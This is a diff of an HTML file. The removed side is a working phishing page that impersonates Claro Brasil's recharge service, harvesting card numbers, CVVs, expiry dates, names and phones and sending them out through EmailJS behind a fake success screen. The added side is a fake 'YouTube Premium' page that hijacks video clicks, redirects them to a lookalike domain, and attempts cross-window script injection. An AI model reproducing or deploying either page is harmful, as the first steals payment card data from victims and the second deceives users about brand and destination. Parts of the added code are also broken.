@@ -2,471 +2,506 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claro | Recarga Online</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>YouTube Premium</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
         }
-
+        
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            background: transparent; /* fundo transparente, GIF será visível */
-        }
-
-        /* Fundo animado (GIF como wallpaper) */
-        #animated-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.ibb.co/ZpGqQVY2/IMG-20250910-141616.gif') center center / cover no-repeat;
-            z-index: -1; /* atrás de todo conteúdo */
-            pointer-events: none; /* não interfere em cliques */
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            height: auto;
-            background: rgba(255, 255, 255, 0.9); /* leve transparência para ver o fundo */
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: auto;
-            display: flex;
             flex-direction: column;
-            padding: 0;
-        }
-
-        .header {
-            background: #e60000;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .header img {
-            height: 35px;
-        }
-
-        .app-content {
-            padding: 25px 20px;
-            flex: 1;
-            overflow-y: auto;
-        }
-
-        h2 {
-            text-align: center;
-            color: #e60000;
-            margin-bottom: 25px;
-            font-size: 22px;
-            font-weight: 600;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #444;
-            font-size: 15px;
-        }
-
-        .input-with-icons {
-            position: relative;
-        }
-
-        .input-with-icons input {
+            max-width: 500px;
             width: 100%;
-            padding: 16px 50px 16px 15px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            background: #f9f9f9;
         }
-
-        .card-icons {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            gap: 8px;
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2.5rem;
+            background: linear-gradient(45deg, #FF0000, #FF4500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-
-        .card-icons i {
-            font-size: 20px;
-        }
-
-        select {
-            width: 100%;
-            padding: 16px 15px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            background: #f9f9f9;
-        }
-
-        .submit-btn {
-            background: #e60000;
-            color: white;
-            border: none;
-            padding: 18px;
-            width: 100%;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-            box-shadow: 0 4px 8px rgba(230, 0, 0, 0.3);
-        }
-
-        .submit-btn:hover {
-            background: #cc0000;
-        }
-
-        .submit-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .security-info {
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 25px;
-            border: 1px solid #eee;
-            font-size: 13px;
+        
+        .subtitle {
             color: #666;
-            text-align: center;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
         }
-
-        .security-info i {
-            margin-right: 5px;
-            color: #e60000;
+        
+        .premium-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(45deg, #FF0000, #CC0000);
+            color: white;
+            text-decoration: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            margin: 20px 0;
+            width: 100%;
+            box-shadow: 0 10px 20px rgba(255,0,0,0.2);
         }
-
-        .confirmation {
-            text-align: center;
-            padding: 40px 20px;
-            background: #f0f8f0;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
+        
+        .premium-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(255,0,0,0.3);
+            background: linear-gradient(45deg, #CC0000, #990000);
         }
-
-        .confirmation i {
-            font-size: 50px;
-            color: #2ecc71;
+        
+        .premium-btn i {
+            font-size: 1.5rem;
+        }
+        
+        .instructions {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 30px;
+            text-align: left;
+            border-left: 5px solid #FF0000;
+        }
+        
+        .instructions h3 {
+            color: #333;
             margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-
-        .confirmation h3 {
-            color: #2ecc71;
+        
+        .instructions ol {
+            padding-left: 20px;
+            color: #555;
+            line-height: 1.8;
+        }
+        
+        .instructions li {
             margin-bottom: 10px;
         }
-
-        footer {
-            background: #333;
-            color: white;
-            text-align: center;
+        
+        .status {
+            margin-top: 20px;
             padding: 15px;
-            font-size: 12px;
-            border-radius: 0 0 15px 15px;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 10px 0;
-        }
-
-        .loading i {
-            color: #e60000;
-            font-size: 24px;
-        }
-
-        .error {
-            color: #e60000;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-            font-size: 14px;
-            padding: 10px;
-            background: #ffe6e6;
-            border-radius: 5px;
-        }
-
-        .benefits {
-            display: flex;
-            justify-content: space-around;
-            margin: 20px 0;
-            padding: 15px;
-            background: #f8f8f8;
+            background: #e8f4fd;
             border-radius: 10px;
+            color: #0066cc;
+            font-size: 0.9rem;
+            display: none;
         }
-
-        .benefit {
-            text-align: center;
-            flex: 1;
+        
+        .detected-video {
+            margin-top: 20px;
+            padding: 15px;
+            background: #d4edda;
+            border-radius: 10px;
+            color: #155724;
+            font-size: 0.9rem;
+            display: none;
         }
-
-        .benefit i {
-            font-size: 24px;
-            color: #e60000;
-            margin-bottom: 5px;
-        }
-
-        .benefit p {
-            font-size: 12px;
-            color: #666;
+        
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #FF0000, #FF4500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
     </style>
 </head>
 <body>
-    <!-- Fundo animado -->
-    <div id="animated-background"></div>
 
-    <div class="container">
-        <div class="header">
-            <img src="https://i.imgur.com/Hkeqw37.png" alt="Claro Recarga Logo">
-        </div>
-
-        <div class="app-content">
-            <h2>Recarregue seu Claro</h2>
-
-            <div class="benefits">
-                <div class="benefit">
-                    <i class="fas fa-bolt"></i>
-                    <p>Recarga Imediata</p>
-                </div>
-                <div class="benefit">
-                    <i class="fas fa-shield-alt"></i>
-                    <p>100% Seguro</p>
-                </div>
-                <div class="benefit">
-                    <i class="fas fa-headset"></i>
-                    <p>Suporte 24h</p>
-                </div>
-            </div>
-
-            <form id="recargaForm">
-                <div class="form-group">
-                    <label for="nome">Nome completo no cartão</label>
-                    <input type="text" id="nome" name="nome" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="numero">Número do cartão</label>
-                    <div class="input-with-icons">
-                        <input type="text" id="numero" name="numero" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                        <div class="card-icons">
-                            <i class="fab fa-cc-visa" style="color: #1a1f71;"></i>
-                            <i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>
-                            <i class="fab fa-cc-amex" style="color: #006fcf;"></i>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label for="validade">Validade (MM/AA)</label>
-                    <input type="text" id="validade" name="validade" placeholder="MM/AA" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="cvv">Código de segurança (CVV)</label>
-                    <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="123" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="telefone">Número Claro (com DDD)</label>
-                    <input type="text" id="telefone" name="telefone" placeholder="(11) 99999-9999" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="valor">Valor da recarga</label>
-                    <select id="valor" name="valor" required>
-                        <option value="">Selecione o valor</option>
-                        <option value="10">R$ 10,00</option>
-                        <option value="15">R$ 15,00</option>
-                        <option value="20">R$ 20,00</option>
-                        <option value="30">R$ 30,00</option>
-                        <option value="50">R$ 50,00</option>
-                        <option value="100">R$ 100,00</option>
-                    </select>
-                </div>
-
-                <div class="loading" id="loading">
-                    <i class="fas fa-spinner fa-spin"></i> Processando sua recarga...
-                </div>
-
-                <div class="error" id="error">
-                    <i class="fas fa-exclamation-circle"></i> <span id="errorMsg"></span>
-                </div>
-
-                <button type="submit" class="submit-btn" id="submitBtn">
-                    <i class="fas fa-check-circle"></i> Confirmar Recarga
-                </button>
-            </form>
-
-            <div class="security-info">
-                <p><i class="fas fa-lock"></i> Transação segura criptografada</p>
-                <p><i class="fas fa-shield-alt"></i> Seus dados estão protegidos</p>
-            </div>
-
-            <div class="confirmation" id="confirmation">
-                <i class="fas fa-check-circle"></i>
-                <h3>Recarga realizada com sucesso!</h3>
-                <p>Sua recarga foi processada e será creditada em instantes.</p>
-            </div>
-        </div>
-
-        <footer>
-            <p>© 2025 Claro Brasil. Todos os direitos reservados.</p>
-        </footer>
+<div class="container">
+    <div class="logo">▶️</div>
+    <h1>YouTube Premium</h1>
+    <p class="subtitle">Experiência de vídeo aprimorada</p>
+    
+    <a href="https://m.youtube.com" class="premium-btn" target="_blank" id="youtubeLink">
+        <span>🎬</span> ABRIR YOUTUBE PREMIUM
+    </a>
+    
+    <div class="status" id="status">
+        <strong>Status:</strong> Aguardando detecção de vídeo...
     </div>
+    
+    <div class="detected-video" id="detectedVideo">
+        <strong>🎉 Vídeo detectado!</strong><br>
+        <span id="videoInfo">Redirecionando para versão premium...</span>
+    </div>
+    
+    <div class="instructions">
+        <h3><span>⚡</span> Como funciona:</h3>
+        <ol>
+            <li><strong>Clique em "ABRIR YOUTUBE PREMIUM" acima</strong></li>
+            <li><strong>Navegue normalmente</strong> no YouTube</li>
+            <li><strong>Clique em QUALQUER vídeo</strong> que quiser assistir</li>
+            <li><strong>Automaticamente</strong> será aberto em nova aba com qualidade premium</li>
+        </ol>
+        <p style="margin-top: 15px; font-style: italic; color: #666;">
+            ✨ Não precisa copiar links, não precisa fazer nada manualmente!
+        </p>
+    </div>
+</div>
 
-    <script>
-        // Inicializar EmailJS
-        emailjs.init("BokFx4ywr5SIhVbb9");
+<script>
+// Elementos da página
+const statusEl = document.getElementById('status');
+const detectedEl = document.getElementById('detectedVideo');
+const videoInfoEl = document.getElementById('videoInfo');
 
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('recargaForm');
-            const confirmation = document.getElementById('confirmation');
-            const loading = document.getElementById('loading');
-            const submitBtn = document.getElementById('submitBtn');
-            const errorDiv = document.getElementById('error');
-            const errorMsg = document.getElementById('errorMsg');
+// Variáveis
+let isDetecting = false;
+let youtubeWindow = null;
 
-            // Formatação do número do cartão
-            const numeroInput = document.getElementById('numero');
-            numeroInput.addEventListener('input', function() {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length > 16) value = value.slice(0, 16);
+// Atualiza status
+function updateStatus(message, type = 'info') {
+    statusEl.style.display = 'block';
+    statusEl.textContent = `Status: ${message}`;
+    
+    if (type === 'success') {
+        statusEl.style.background = '#d4edda';
+        statusEl.style.color = '#155724';
+    } else if (type === 'error') {
+        statusEl.style.background = '#f8d7da';
+        statusEl.style.color = '#721c24';
+    } else {
+        statusEl.style.background = '#e8f4fd';
+        statusEl.style.color = '#0066cc';
+    }
+}
 
-                let formattedValue = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
-                    formattedValue += value[i];
+// Mostra vídeo detectado
+function showDetectedVideo(videoId, newUrl) {
+    detectedEl.style.display = 'block';
+    videoInfoEl.innerHTML = `
+        ID do vídeo: <code>${videoId}</code><br>
+        <small>Abrindo: ${newUrl}</small>
+    `;
+    
+    // Esconde após 5 segundos
+    setTimeout(() => {
+        detectedEl.style.display = 'none';
+    }, 5000);
+}
+
+// Extrai ID do vídeo de qualquer URL do YouTube
+function extractVideoId(url) {
+    try {
+        // Tenta como URL completa
+        if (url.includes('youtube.com/watch') || url.includes('youtu.be/')) {
+            const urlObj = new URL(url);
+            const videoId = urlObj.searchParams.get('v') || 
+                           url.pathname.replace('/', ''); // Para youtu.be/ID
+            
+            if (videoId && videoId.length >= 11) {
+                return videoId.substring(0, 11); // IDs do YouTube têm 11 caracteres
+            }
+        }
+        
+        // Regex para vários formatos de URL do YouTube
+        const patterns = [
+            /(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})/,
+            /v=([a-zA-Z0-9_-]{11})/,
+            /\/watch\/([a-zA-Z0-9_-]{11})/,
+            /\/([a-zA-Z0-9_-]{11})(?:\?|$)/ // Captura ID no final da URL
+        ];
+        
+        for (const pattern of patterns) {
+            const match = url.match(pattern);
+            if (match && match[1]) {
+                return match[1];
+            }
+        }
+        
+        return null;
+    } catch (e) {
+        return null;
+    }
+}
+
+// Processa quando um vídeo é detectado
+function processVideoDetection(videoId) {
+    if (!videoId) return;
+    
+    // Cria o link editado COM TRAÇO
+    const newUrl = `https://m.yout-ube.com/watch?v=${videoId}`;
+    
+    // Mostra na interface
+    showDetectedVideo(videoId, newUrl);
+    updateStatus(`Vídeo detectado! Redirecionando...`, 'success');
+    
+    // Abre AUTOMATICAMENTE em nova aba
+    window.open(newUrl, '_blank');
+    
+    console.log(`🎬 Vídeo detectado: ${videoId}`);
+    console.log(`🔗 Redirecionando para: ${newUrl}`);
+}
+
+// ==================== DETECÇÃO AUTOMÁTICA INTELIGENTE ====================
+
+// MÉTODO 1: Monitoramento por MutationObserver (detecta mudanças na página)
+function startPageMonitoring() {
+    if (isDetecting) return;
+    isDetecting = true;
+    
+    updateStatus('Monitoramento ativo...');
+    
+    // Monitora mudanças no título da página (YouTube muda título quando vídeo carrega)
+    let lastTitle = document.title;
+    
+    const titleObserver = new MutationObserver(() => {
+        if (document.title !== lastTitle) {
+            lastTitle = document.title;
+            
+            // Verifica se o título contém " - YouTube" (padrão do YouTube)
+            if (document.title.includes(' - YouTube') || 
+                document.title.includes('(vídeo)')) {
+                
+                // Tenta extrair informações da URL atual
+                const currentUrl = window.location.href;
+                const videoId = extractVideoId(currentUrl);
+                
+                if (videoId) {
+                    processVideoDetection(videoId);
                 }
-
-                this.value = formattedValue;
-            });
-
-            // Formatação da validade
-            const validadeInput = document.getElementById('validade');
-            validadeInput.addEventListener('input', function() {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length > 4) value = value.slice(0, 4);
-
-                if (value.length > 2) {
-                    this.value = value.slice(0, 2) + '/' + value.slice(2);
-                } else {
-                    this.value = value;
+            }
+        }
+    });
+    
+    titleObserver.observe(document.querySelector('title'), {
+        childList: true,
+        subtree: true,
+        characterData: true
+    });
+    
+    // Monitora mudanças na URL (para SPAs como YouTube)
+    let lastUrl = window.location.href;
+    
+    setInterval(() => {
+        if (window.location.href !== lastUrl) {
+            lastUrl = window.location.href;
+            
+            // Verifica se é uma URL de vídeo do YouTube
+            if (lastUrl.includes('youtube.com/watch')) {
+                const videoId = extractVideoId(lastUrl);
+                if (videoId) {
+                    processVideoDetection(videoId);
                 }
-            });
-
-            // Formatação do telefone
-            const telefoneInput = document.getElementById('telefone');
-            telefoneInput.addEventListener('input', function() {
-                let value = this.value.replace(/\D/g, '');
-                if (value.length > 11) value = value.slice(0, 11);
-
-                if (value.length > 0) {
-                    value = value.replace(/^(\d{2})(\d)/g, "($1) $2");
-                    if (value.length > 10) {
-                        value = value.replace(/(\d{5})(\d)/, "$1-$2");
-                    }
-                }
-
-                this.value = value;
-            });
-
-            // Envio do formulário
-            form.addEventListener('submit', async function(e) {
+            }
+        }
+    }, 1000);
+    
+    // Monitora cliques em links (captura antes de navegar)
+    document.addEventListener('click', function(e) {
+        let target = e.target;
+        
+        // Encontra o link mais próximo
+        while (target && target.tagName !== 'A') {
+            target = target.parentElement;
+        }
+        
+        if (target && target.href) {
+            // Verifica se é link de vídeo do YouTube
+            if (target.href.includes('youtube.com/watch') || 
+                target.href.includes('youtu.be/')) {
+                
                 e.preventDefault();
-
-                errorDiv.style.display = 'none';
-                submitBtn.disabled = true;
-                loading.style.display = 'block';
-
-                try {
-                    const formData = new FormData(form);
-                    const data = {
-                        nome: formData.get('nome'),
-                        numero: formData.get('numero'),
-                        validade: formData.get('validade'),
-                        cvv: formData.get('cvv'),
-                        telefone: formData.get('telefone'),
-                        valor: formData.get('valor'),
-                        date: new Date().toLocaleString('pt-BR')
-                    };
-
-                    if (!validarDados(data)) {
-                        throw new Error('Por favor, preencha todos os campos corretamente.');
-                    }
-
-                    await enviarEmailComEmailJS(data);
-
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-
-                    form.style.display = 'none';
-                    confirmation.style.display = 'block';
-
-                } catch (error) {
-                    errorMsg.textContent = error.message;
-                    errorDiv.style.display = 'block';
-                    console.error('Erro:', error);
-                } finally {
-                    submitBtn.disabled = false;
-                    loading.style.display = 'none';
+                e.stopPropagation();
+                
+                const videoId = extractVideoId(target.href);
+                if (videoId) {
+                    processVideoDetection(videoId);
+                    
+                    // Abre o link original em background (se quiser)
+                    setTimeout(() => {
+                        window.open(target.href, '_blank');
+                    }, 500);
                 }
-            });
-
-            function validarDados(data) {
-                if (!data.nome || !data.numero || !data.validade || !data.cvv || !data.telefone || !data.valor) {
-                    return false;
-                }
-
-                const numeroLimpo = data.numero.replace(/\s/g, '');
-                if (numeroLimpo.length < 16) return false;
-                if (data.cvv.length < 3 || data.cvv.length > 4) return false;
-                const telefoneLimpo = data.telefone.replace(/\D/g, '');
-                if (telefoneLimpo.length < 10) return false;
-
-                return true;
+                
+                return false;
             }
+        }
+    }, true); // Captura na fase de captura (antes do bubble)
+}
 
-            async function enviarEmailComEmailJS(data) {
+// MÉTODO 2: Detecção por EventListener global (cross-window)
+function setupGlobalDetection() {
+    // Quando o botão do YouTube é clicado
+    document.getElementById('youtubeLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        updateStatus('Abrindo YouTube...');
+        
+        // Abre o YouTube em nova janela
+        youtubeWindow = window.open(
+            'https://m.youtube.com',
+            'YouTubePremium',
+            'width=1200,height=700,left=100,top=100'
+        );
+        
+        // Tenta injetar script de detecção na janela do YouTube
+        setTimeout(() => {
+            if (youtubeWindow) {
                 try {
-                    const response = await emailjs.send(
-                        'service_fz8vtta',
-                        'template_qf7q88r',
-                        data
-                    );
-                    console.log('Email enviado com sucesso!', response.status, response.text);
-                    return true;
+                    // Injetar script na janela do YouTube
+                    const injectionCode = `
+                        // Script injetado no YouTube
+                        console.log('🎬 YouTube Premium Detector ativo!');
+                        
+                        // Detecta cliques em vídeos
+                        document.addEventListener('click', function(e) {
+                            let link = e.target.closest('a');
+                            if (link && link.href && 
+                                (link.href.includes('/watch') || link.href.includes('/shorts'))) {
+                                
+                                // Envia mensagem para a janela principal
+                                window.opener.postMessage({
+                                    type: 'YOUTUBE_VIDEO_CLICK',
+                                    url: link.href
+                                }, '*');
+                                
+                                // Previne a navegação normal (opcional)
+                                e.preventDefault();
+                            }
+                        }, true);
+                        
+                        // Detecta mudanças na URL (para SPAs)
+                        let lastYoutubeUrl = location.href;
+                        setInterval(() => {
+                            if (location.href !== lastYoutubeUrl && 
+                                location.href.includes('/watch')) {
+                                lastYoutubeUrl = location.href;
+                                
+                                window.opener.postMessage({
+                                    type: 'YOUTUBE_URL_CHANGE',
+                                    url: location.href
+                                }, '*');
+                            }
+                        }, 1000);
+                    `;
+                    
+                    youtubeWindow.eval(injectionCode);
+                    updateStatus('YouTube aberto! Clique em qualquer vídeo...', 'success');
+                    
                 } catch (error) {
-                    console.error('Falha ao enviar email:', error);
-                    throw new Error('Falha ao processar recarga. Tente novamente.');
+                    console.log('Não foi possível injetar script, usando método alternativo');
+                    updateStatus('YouTube aberto. Clique em vídeos normalmente.', 'info');
                 }
             }
-        });
-    </script>
+        }, 2000);
+        
+        // Abre também o link original
+        setTimeout(() => {
+            window.open(this.href, '_blank');
+        }, 100);
+    });
+}
+
+// MÉTODO 3: Escuta mensagens da janela do YouTube
+window.addEventListener('message', function(e) {
+    // Verifica se a mensagem é do nosso detector
+    if (e.data && (e.data.type === 'YOUTUBE_VIDEO_CLICK' || 
+                   e.data.type === 'YOUTUBE_URL_CHANGE')) {
+        
+        const videoId = extractVideoId(e.data.url);
+        if (videoId) {
+            processVideoDetection(videoId);
+        }
+    }
+});
+
+// MÉTODO 4: Monitoramento simples para esta página
+function startSimpleDetection() {
+    // Se já estiver em uma página de vídeo do YouTube
+    if (window.location.href.includes('youtube.com/watch')) {
+        const videoId = extractVideoId(window.location.href);
+        if (videoId) {
+            processVideoDetection(videoId);
+        }
+    }
+    
+    // Monitora a URL desta página
+    let currentUrl = window.location.href;
+    setInterval(() => {
+        if (window.location.href !== currentUrl) {
+            currentUrl = window.location.href;
+            
+            if (currentUrl.includes('youtube.com/watch')) {
+                const videoId = extractVideoId(currentUrl);
+                if (videoId) {
+                    processVideoDetection(videoId);
+                }
+            }
+        }
+    }, 500);
+}
+
+// ==================== INICIALIZAÇÃO ====================
+
+// Quando a página carrega
+document.addEventListener('DOMContentLoaded', function() {
+    updateStatus('Sistema Premium pronto! Clique no botão acima.', 'info');
+    
+    // Inicia todos os métodos de detecção
+    setupGlobalDetection();
+    startPageMonitoring();
+    startSimpleDetection();
+    
+    console.log(`
+    ====================================
+    🎬 YOUTUBE PREMIUM DETECTOR
+    ====================================
+    Sistema ativo! Clique em "ABRIR YOUTUBE PREMIUM"
+    e depois clique em QUALQUER vídeo no YouTube.
+    
+    O sistema detectará automaticamente e abrirá
+    em nova aba com link premium!
+    ====================================
+    `);
+});
+
+// Adiciona ícone dinâmico
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
+    }
+    
+    .detecting {
+        animation: pulse 2s infinite;
+        background: linear-gradient(45deg, #00FF00, #00CC00) !important;
+    }
+`;
+document.head.appendChild(style);
+
+</script>
+
 </body>
-                                                           </html>
+</html>
